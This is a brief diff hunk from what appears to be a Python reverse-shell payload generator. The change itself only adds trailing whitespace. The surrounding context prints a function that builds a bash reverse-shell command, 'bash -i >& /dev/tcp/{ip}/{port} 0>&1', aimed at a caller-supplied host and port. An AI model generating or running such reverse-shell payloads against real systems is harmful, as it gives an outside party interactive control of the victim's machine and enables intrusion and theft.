@@ -9,7 +9,7 @@ import base64
 import argparse
 from urllib.parse import quote
 
-def generate_bash_payload(ip, port):
+def generate_bash_payload(ip, port): 
     """Generate bash reverse shell"""
     return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
 
